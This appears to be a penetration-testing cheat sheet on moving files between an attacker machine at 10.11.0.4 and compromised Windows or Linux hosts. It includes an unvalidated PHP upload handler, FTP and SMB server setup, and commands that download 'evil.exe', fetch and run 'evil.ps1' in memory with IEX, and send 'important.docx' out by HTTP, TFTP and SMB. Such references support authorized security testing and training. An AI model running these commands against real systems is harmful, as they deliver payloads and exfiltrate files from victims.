---
description: >-
  Include scipts, commands to quickly transfer files to and from a remote
  server.
---

# File Transfer

### Server

Create a listener to receive files from a remote client.

#### PHP webserver

Create `/var/www/html/upload.php`

```php
// upload.php
<?php
    $uploaddir = '/var/www/uploads/';
    $uploadfile = $uploaddir . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Create `uploads` folder in /var/www/html/

```sh
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

#### FTP server

Install Pure-FTPd:

```sh
sudo apt update && sudo apt install pure-ftpd
```

Create FTP user, home folder:

```sh
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd ftp -u ftpuser -d /home/ftp
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /home/ftp
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

#### SMB Server

SMBv1

```sh
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

SMBv2

{% code overflow="wrap" %}
```sh
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username kali -password kali kali .
```
{% endcode %}

### Windows client

#### HTTP

**Download**

{% code overflow="wrap" %}
```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'evil.exe')
```
{% endcode %}

```powershell
powershell Invoke-WebRequest -Uri http://10.11.0.4/evil.exe -OutFile evil.exe
```

**Run a PowerShell script from remote file without saving**

{% code overflow="wrap" %}
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/evil.ps1')
```
{% endcode %}

**Execute an Invoke powershell in CMD**

Call the funtion right in the file

```sh
function Invoke-MS16032 {
    ...
}

Invoke-MS16032 "IEX ..."
```

**Upload**

{% code overflow="wrap" %}
```sh
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```
{% endcode %}

#### FTP

Use FTP command (use SEND/GET command to transfer files):

```sh
open 10.11.0.4 21
USER ftp 
ftp 
bin
GET nc.exe 
bye 
```

Interactive shell:

```sh
echo open 10.11.0.4 21 > ftp.txt
echo USER offsec >> ftp.txt
echo lab >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye
```

Run ftp with file:

```sh
ftp -v -n -s:ftp.txt
```

#### TFTP

```sh
tftp -i 10.11.0.4 put important.docx
```

#### SMB

Authentication:

```sh
net use \\10.10.10.10 /USER:kali kali
```

**Download**

```sh
copy \\10.10.10.10\kali\important.docx c:\important.docx
```

**Upload**

```sh
copy c:\important.docx \\10.10.10.10\kali
```

### Linux Client

#### HTTP

**Download**

```sh
wget http://10.0.0.4/evil -O evil
```

```sh
curl http://10.0.0.4/evil -o evil
```

**Upload**

```sh
curl -i -X POST -F 'file=@evil.exe' http://10.0.0.4/upload.php
```

#### FTP

**Use FTP client**

```sh
ftp username:password@ftpserver
```

```sh
PUT evil.elf
GET evil.elf
```

**Use wget**

```sh
wget ftp://username:password@ftpserver/evil.elf
```
